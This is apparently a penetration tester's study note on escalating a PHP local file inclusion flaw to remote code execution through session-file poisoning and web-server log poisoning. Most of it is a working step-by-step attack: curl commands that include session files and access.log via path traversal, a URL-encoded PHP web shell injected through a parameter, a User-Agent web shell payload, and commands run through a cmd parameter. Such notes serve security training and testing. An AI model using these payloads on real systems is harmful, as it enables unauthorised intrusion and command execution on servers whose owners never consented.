We tryna write PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code to gain RCE.

### PHP Session Poisoning
Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session:
![[Pasted image 20250218232907.png]]
As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents

```bash
curl http://10.10.10.10/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

The next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:

```bash
curl http://10.10.10.10/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Exploit
```bash
curl http://10.10.10.10/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

### Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs with a **PHP wbeshell**

```bash
curl http://adot.com/app/index.php?page=../../../../../var/log/apache2/access.log
```

Should have something like this
```bash
10.10.14.1 - - [19/Jun/2024:12:11:34 +0000] "GET /app/index.php?page=admin.php
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
```

We can edit the User-Agent to the following in Burp
```php
<?php echo system($_GET['cmd']); ?>
```

Now we can run commnads
```bash
curl http://adot.com/app/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami
```

We can the above with these logs as well
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability